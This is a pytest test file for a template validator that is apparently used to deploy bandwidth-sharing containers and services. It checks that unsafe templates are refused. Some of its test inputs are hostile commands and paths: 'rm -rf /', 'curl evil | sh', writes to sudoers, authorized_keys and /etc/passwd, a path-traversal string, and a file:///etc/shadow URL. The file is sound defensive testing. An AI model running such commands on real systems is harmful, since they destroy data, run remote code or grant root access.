"""The security boundary: what a template may and may not express.

Most of these are refusals. That is the point - the value of this validator is
in what it will not build, so the tests that matter are the ones that try to
smuggle something past it.
"""

from __future__ import annotations

import pytest

from boredagent.templates import validate_template


def container(**overrides):
    doc = {
        "id": "honeygain",
        "displayName": "Honeygain",
        "kind": "container",
        "fields": [
            {"id": "email", "label": "Email", "required": True},
            {"id": "password", "label": "Password", "input": "password", "required": True},
        ],
        "container": {
            "units": [
                {
                    "name": "honeygain",
                    "image": "honeygain/honeygain",
                    "primary": True,
                    "args": ["-tou-accept", "-email", "{{email}}", "-pass", "{{password}}"],
                }
            ]
        },
        "redact": ["password"],
    }
    doc.update(overrides)
    return doc


def service(steps):
    return {
        "id": "generic-svc",
        "displayName": "Generic",
        "kind": "service",
        "service": {"units": [{"unit": "generic.service", "primary": True, "install": steps}]},
    }


def errors(result):
    return [f.message for f in result.findings if f.level == "error"]


class TestAccepts:
    def test_a_well_formed_container_template(self):
        result = validate_template(container())
        assert result.ok
        assert result.template is not None
        assert result.template.unit_names == ("honeygain",)
        assert result.template.secret_field_ids == ("password",)

    def test_password_input_is_secret_even_when_not_marked(self):
        doc = container(fields=[{"id": "pw", "label": "Password", "input": "password"}])
        doc["container"]["units"][0]["args"] = ["-pass", "{{pw}}"]
        doc["redact"] = []
        result = validate_template(doc)
        assert result.ok
        assert result.template.secret_field_ids == ("pw",)

    def test_primary_unit_comes_first_whatever_the_declaration_order(self):
        doc = container()
        doc["container"]["units"] = [
            {"name": "watchtower", "image": "containrrr/watchtower", "optional": True},
            {"name": "psclient", "image": "packetstream/psclient", "primary": True},
        ]
        doc["container"]["units"][1]["args"] = []
        result = validate_template(doc)
        assert result.ok
        assert result.template.unit_names[0] == "psclient"
        assert result.template.required_units == ("psclient",)


class TestRefusesShellInjection:
    def test_an_unknown_opcode(self):
        result = validate_template(service([{"op": "exec", "argv": ["sh", "-c", "rm -rf /"]}]))
        assert not result.ok
        assert any("not one of the opcodes" in m for m in errors(result))

    def test_script_without_the_privileged_declaration(self):
        result = validate_template(service([{"op": "script", "body": "curl evil | sh"}]))
        assert not result.ok
        assert any("privileged" in m for m in errors(result))

    def test_script_is_allowed_once_declared_but_warns(self):
        doc = service([{"op": "script", "body": "echo hello"}])
        doc["privileged"] = True
        result = validate_template(doc)
        assert result.ok
        assert any(f.level == "warning" and "shell as root" in f.message for f in result.findings)

    def test_a_placeholder_naming_a_field_that_does_not_exist(self):
        # This is the shape of a template trying to read a value it was never
        # given - or a typo that would silently substitute nothing.
        doc = container()
        doc["container"]["units"][0]["args"] = ["-email", "{{emial}}"]
        result = validate_template(doc)
        assert not result.ok
        assert any("emial" in m for m in errors(result))

    def test_a_placeholder_in_a_container_name_or_image(self):
        doc = container()
        doc["container"]["units"][0]["image"] = "{{email}}/thing"
        result = validate_template(doc)
        assert not result.ok
        assert any("may not interpolate" in m for m in errors(result))


class TestRefusesPathEscapes:
    @pytest.mark.parametrize(
        "path",
        [
            "/etc/sudoers.d/boredagent",
            "/root/.ssh/authorized_keys",
            "/etc/passwd",
            "relative/path",
            "/opt/../etc/sudoers.d/x",
        ],
    )
    def test_writing_outside_the_allowed_prefixes(self, path):
        result = validate_template(service([{"op": "writeFile", "path": path, "content": "x"}]))
        assert not result.ok, path
        assert errors(result)

    def test_a_path_built_from_a_field(self):
        doc = service([{"op": "writeFile", "path": "/opt/{{name}}/run", "content": "x"}])
        doc["fields"] = [{"id": "name", "label": "Name"}]
        result = validate_template(doc)
        assert not result.ok
        assert any("literal" in m for m in errors(result))

    def test_an_allowed_prefix_is_accepted(self):
        result = validate_template(
            service([{"op": "writeFile", "path": "/etc/systemd/system/generic.service", "content": "[Unit]"}])
        )
        assert result.ok, errors(result)


class TestRefusesUnpinnedDownloads:
    def test_a_download_with_no_hash(self):
        result = validate_template(
            service([{"op": "download", "url": "https://example.com/bin", "dest": "/opt/x/bin"}])
        )
        assert not result.ok
        assert any("sha256" in m for m in errors(result))

    def test_a_download_with_a_short_or_malformed_hash(self):
        result = validate_template(
            service(
                [
                    {
                        "op": "download",
                        "url": "https://example.com/bin",
                        "dest": "/opt/x/bin",
                        "sha256": "deadbeef",
                    }
                ]
            )
        )
        assert not result.ok

    def test_a_pinned_download_is_accepted(self):
        result = validate_template(
            service(
                [
                    {
                        "op": "download",
                        "url": "https://example.com/bin",
                        "dest": "/opt/x/bin",
                        "sha256": "a" * 64,
                    }
                ]
            )
        )
        assert result.ok, errors(result)


class TestRefusesMalformedDocuments:
    def test_something_that_is_not_an_object(self):
        assert not validate_template([]).ok
        assert not validate_template("template").ok
        assert not validate_template(None).ok

    def test_a_schema_version_from_the_future(self):
        result = validate_template(container(schemaVersion=99))
        assert not result.ok
        assert any("understands up to" in m for m in errors(result))

    def test_a_bad_id(self):
        for bad in ["X", "1abc", "with space", "a", "", "a" * 40]:
            assert not validate_template(container(id=bad)).ok, bad

    def test_no_primary_unit(self):
        doc = container()
        doc["container"]["units"][0]["primary"] = False
        result = validate_template(doc)
        assert not result.ok
        assert any("primary" in m for m in errors(result))

    def test_two_primary_units(self):
        doc = container()
        doc["container"]["units"] = [
            {"name": "a", "image": "i", "primary": True},
            {"name": "b", "image": "i", "primary": True},
        ]
        result = validate_template(doc)
        assert not result.ok
        assert any("primary" in m for m in errors(result))

    def test_duplicate_field_ids(self):
        doc = container(
            fields=[{"id": "email", "label": "A"}, {"id": "email", "label": "B"}]
        )
        doc["container"]["units"][0]["args"] = []
        result = validate_template(doc)
        assert not result.ok
        assert any("twice" in m for m in errors(result))

    def test_duplicate_unit_names(self):
        doc = container()
        doc["container"]["units"] = [
            {"name": "same", "image": "i", "primary": True},
            {"name": "same", "image": "i"},
        ]
        result = validate_template(doc)
        assert not result.ok

    def test_a_container_template_with_no_container_block(self):
        doc = container()
        del doc["container"]
        assert not validate_template(doc).ok

    def test_every_problem_is_reported_at_once(self):
        # One error per attempt would make fixing a template a guessing game.
        doc = container(id="BAD", version="nope")
        doc["container"]["units"][0]["primary"] = False
        result = validate_template(doc)
        assert len(errors(result)) >= 3


class TestDownloadValuesFromFields:
    """A generic template is a shape: the operator supplies the URL and hash.

    The guarantee is not "the author chose the hash" but "there is a hash and
    the bytes are checked against it", so a whole field standing in for either
    is fine - and a field spliced into the middle of one is not.
    """

    def _doc(self, url, digest, fields=None):
        doc = service(
            [{"op": "download", "url": url, "dest": "/opt/x/bin", "sha256": digest}]
        )
        doc["fields"] = fields if fields is not None else [
            {"id": "u", "label": "URL"},
            {"id": "h", "label": "Hash"},
        ]
        return doc

    def test_a_whole_field_for_both(self):
        result = validate_template(self._doc("{{u}}", "{{h}}"))
        assert result.ok, errors(result)

    def test_a_field_spliced_into_a_url(self):
        result = validate_template(self._doc("https://host/{{u}}/bin", "{{h}}"))
        assert not result.ok
        assert any("one whole field" in m for m in errors(result))

    def test_a_field_spliced_into_a_hash(self):
        result = validate_template(self._doc("{{u}}", "aa{{h}}"))
        assert not result.ok

    def test_a_field_that_does_not_exist(self):
        result = validate_template(self._doc("{{nope}}", "{{h}}"))
        assert not result.ok
        assert any("nope" in m for m in errors(result))

    def test_a_hash_is_still_required(self):
        doc = service([{"op": "download", "url": "{{u}}", "dest": "/opt/x/bin"}])
        doc["fields"] = [{"id": "u", "label": "URL"}]
        result = validate_template(doc)
        assert not result.ok
        assert any("sha256" in m for m in errors(result))

    def test_a_literal_url_still_has_to_be_http(self):
        result = validate_template(self._doc("file:///etc/shadow", "a" * 64))
        assert not result.ok
        assert any("http(s)" in m for m in errors(result))
